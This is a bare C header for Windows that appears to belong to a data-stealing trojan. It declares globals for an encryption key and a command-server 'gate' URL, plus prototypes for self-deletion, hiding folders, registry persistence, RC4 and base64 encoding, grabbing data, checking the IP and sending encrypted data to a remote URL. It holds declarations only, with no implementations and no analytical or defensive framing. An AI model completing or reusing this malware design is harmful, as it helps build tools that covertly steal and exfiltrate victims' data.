#include <stdio.h>
#include <windows.h>
#include <libgen.h>
#include <iphlpapi.h>
#include <Shlobj.h>
#include <dirent.h>
#include <tlhelp32.h>
#include <wininet.h>
//---------------------------------------
extern char key[33];
extern char skey[33];
extern char sgate[96];
extern char sfilename[11];
extern char sfiledir[128];
extern char sfilepath[128];
extern char sclient[64];
extern char localFileName[128];
//---------------------------------------
int findBytes(char *data, int ldata, char *search, int lsearch);
void getVars();
char* getFilePath();
int checkFile();
int checkPath();
char* createFile();
void createRegKey(char *filepath);
void selfDelete();
void hideFolder();
void rc4(char *data, char *key);
char* base64_encode(char *string, int len);
char* base64_decode(char *bufcoded, int len);
BOOL sendData(char *url, char *data, int id, int isEnc);
char* readData(char *url, int isEnc, int* binSize);
DWORD WINAPI createTimer(LPVOID lpParam);
void checkIP();
void grab();
char* getString(int key);
void saveString(char* buffer);
int getSize(char* fileName);
void getLocalFileName(int n);
void getProcessName(int pid, char *name);
